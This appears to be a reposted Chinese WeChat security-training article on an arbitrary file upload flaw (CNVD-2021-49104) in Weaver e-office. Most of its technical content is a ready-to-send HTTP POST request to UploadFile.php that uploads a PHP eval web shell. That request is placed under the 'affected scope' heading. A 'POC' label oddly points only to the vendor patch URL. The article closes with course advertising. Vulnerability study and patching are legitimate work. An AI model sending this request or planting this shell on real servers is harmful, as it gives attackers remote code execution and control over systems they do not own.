<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/phNPLBJMZ62t8yYcNiCesA)

********文章来源｜MS08067 Web 安全知识星球********  

本文作者：**Taoing**（Web 漏洞挖掘班讲师）

参考：

```
https://cnvd.org.cn/flaw/show/CNVD-2021-49104
https://mp.weixin.qq.com/s/P75K_0869h-nWHRMu06zgQ
https://mp.weixin.qq.com/s/J4R-PRJq_oi58iWKh_1Oiw
```

**泛微 oa 跟 eoffice 区别：  
**

**常见 oa 是 ecology，eoffice 是轻量版**  

![](https://mmbiz.qpic.cn/mmbiz_png/XWPpvP3nWa8dvVXvugicZLoDCDWiaWBWUAmumbdp5oHe5h7pGd4oTh1x4Qwcg5MQnNAVia88sRFyYN4NXUUcwr9xA/640?wx_fmt=png)

### 一、漏洞概述

泛微 e-office 是泛微旗下的一款标准协同移动办公平台。

泛微 e-office 未能正确处理上传模块中用户输入导致的，攻击者可以构造恶意的上传数据包，实现任意代码执行，攻击者可利用该漏洞获取服务器控制权。

### 二、影响范围

```
POST /general/index/UploadFile.php?m=uploadPicture&uploadType=eoffice_logo&userId= HTTP/1.1
Host: 127.0.0.1:8082
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36
Accept-Encoding: gzip, deflate
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Connection: close
Accept-Language: zh-CN,zh-TW;q=0.9,zh;q=0.8,en-US;q=0.7,en;q=0.6
Cookie: LOGIN_LANG=cn; PHPSESSID=0acfd0a2a7858aa1b4110eca1404d348
Content-Length: 333
Content-Type: multipart/form-data; boundary=e64bdf16c554bbc109cecef6451c26a4

--e64bdf16c554bbc109cecef6451c26a4
Content-Disposition: form-data; 
Content-Type: image/jpeg

<?php
$a=$_POST['H'];
eval("$a");//eval会将输入的$a作为php语句执行，因此只要对_赋一定的system命令值，就能够执行系统命令
?>

--e64bdf16c554bbc109cecef6451c26a4--
```

### 三、漏洞复现

安装包：  

链接: https://pan.baidu.com/s/1i4DQ4YD 密码: fegm

![](https://mmbiz.qpic.cn/mmbiz_png/XWPpvP3nWa8dvVXvugicZLoDCDWiaWBWUAwr1wsBufVn9OGWloOnLHUmwQgZ8IZjOKJWFLn64jpia6TGpHDHzIKDA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/XWPpvP3nWa8dvVXvugicZLoDCDWiaWBWUAYTkpdHYeZ3Toib4KBgQywGjU0EsoYtw934j1icSYNFnlXoXINBqmoE9w/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/XWPpvP3nWa8dvVXvugicZLoDCDWiaWBWUA7UKibwYZicVKMVHDC0q5Rd8vEubc5aE2p9nVC6jcAV4oz3Pd8WiaHUU1g/640?wx_fmt=png)

#### POC：

```
http://v10.e-office.cn/eoffice9update/safepack.zip
```

### 四、修复方案

```
厂商已提供漏洞修补方案，建议用户下载使用：
```

```
http://v10.e-office.cn/eoffice9update/safepack.zip
```

**课程咨询请联系小客服**  

![](https://mmbiz.qpic.cn/mmbiz_jpg/XWPpvP3nWaic7PmuiclIvD4GdJTRLwCZx3icnFdNc5iatEKWoEwtDiaQaiahUm6fj8nboPicd9vddIo3SYQrqQibtMUwbw/640?wx_fmt=jpeg)

**扫描下方二维码加入星球学习**  

**加入后邀请你进入内部微信群，内部微信群永久有效！**

![](https://mmbiz.qpic.cn/mmbiz_png/XWPpvP3nWa9Y7Ac6gb6JZVymJwS3gu8cniaUZzJeYAibE3v2VnNlhyC6fSTgtW94Pz51p0TSUl3AtZw0L1bDaAKw/640?wx_fmt=png) ![](https://mmbiz.qpic.cn/mmbiz_png/XWPpvP3nWa9Y7Ac6gb6JZVymJwS3gu8cT2rJYbRzsO9Q3J9rSltBVzts0O7USfFR8iaFOBwKdibX3hZiadoLRJIibA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/XWPpvP3nWaicBVC2S4ujJibsVHZ8Us607qBMpNj25fCmz9hP5T1yA6cjibXXCOibibSwQmeIebKa74v6MXUgNNuia7Uw/640?wx_fmt=png)![](https://mmbiz.qpic.cn/mmbiz_png/XWPpvP3nWa9Y7Ac6gb6JZVymJwS3gu8cRey7icGjpsvppvqqhcYo6RXAqJcUwZy3EfeNOkMRS37m0r44MWYIYmg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_jpg/XWPpvP3nWaicjovru6mibAFRpVqK7ApHAwiaEGVqXtvB1YQahibp6eTIiaiap2SZPer1QXsKbNUNbnRbiaR4djJibmXAfQ/640?wx_fmt=jpeg) ![](https://mmbiz.qpic.cn/mmbiz_png/XWPpvP3nWaicJ39cBtzvcja8GibNMw6y6Amq7es7u8A8UcVds7Mpib8Tzu753K7IZ1WdZ66fDianO2evbG0lEAlJkg/640?wx_fmt=png)  

**来和 5000 + 位同学一起加入星球学习吧！**  
![](https://mmbiz.qpic.cn/mmbiz_gif/XWPpvP3nWa9FwrfJTzPRIyROZ2xwWyk6xuUY59uvYPCLokCc6iarKrkOWlEibeRI9DpFmlyNqA2OEuQhyaeYXzrw/640?wx_fmt=gif)